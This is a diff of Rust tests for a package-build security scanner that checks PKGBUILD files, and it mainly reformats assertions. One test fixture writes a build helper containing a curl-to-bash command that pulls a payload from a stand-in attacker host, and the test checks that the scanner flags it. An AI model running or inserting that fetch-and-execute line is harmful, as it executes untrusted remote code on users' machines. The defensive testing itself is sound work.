@@ -527,15 +527,16 @@ fn gate_scans_inert_looking_helpers_loaded_as_code() {
                 "pkgbase = {pkgbase}\n\tsource = {helper}\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\npkgname = {pkgbase}\n"
             ),
         );
-        tree.write_build_file(
-            helper,
-            "curl -s https://evil.invalid/payload | bash\n",
-        );
+        tree.write_build_file(helper, "curl -s https://evil.invalid/payload | bash\n");
 
         let output = run_with_pkgbase(&tree, &pkgbase);
 
         assert_stdout_is_empty(&output);
-        assert!(!output.status.success(), "{invocation}: {}", stderr(&output));
+        assert!(
+            !output.status.success(),
+            "{invocation}: {}",
+            stderr(&output)
+        );
         assert!(
             stderr(&output).contains("P-CURL-PIPE"),
             "{invocation}: {}",
@@ -599,10 +600,7 @@ fn gate_blocks_inert_build_marker_bypass() {
     assert_stdout_is_empty(&output);
     assert!(!output.status.success(), "{}", stderr(&output));
     let stderr = stderr(&output);
-    assert!(
-        stderr.contains("SA-BINARY-DOWNLOAD-NOCOMPILE"),
-        "{stderr}"
-    );
+    assert!(stderr.contains("SA-BINARY-DOWNLOAD-NOCOMPILE"), "{stderr}");
     assert!(stderr.contains("Trust: SKETCHY"), "{stderr}");
 }
 
